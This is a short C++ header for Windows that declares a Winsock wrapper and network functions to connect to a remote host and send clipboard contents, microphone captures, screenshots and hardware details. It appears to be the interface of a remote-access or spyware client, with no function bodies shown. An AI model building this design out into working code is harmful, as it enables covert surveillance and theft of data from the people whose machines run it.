#pragma once
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <WinSock2.h>
#pragma comment(lib,"Ws2_32.lib")

class wsaWrapper
{
	WSADATA wsa;
	int res = 0;
	
public:
	wsaWrapper();
	~wsaWrapper();
};

namespace network {
	static SOCKET srvSOCKET = INVALID_SOCKET;
	int _connect(std::string dns, short PORT);
	int _sendClipbord();
	int _captureMic();
	int _sendScrShot();
	int _sendHWSpecs();
}

std::string getIPv4(std::string dns);

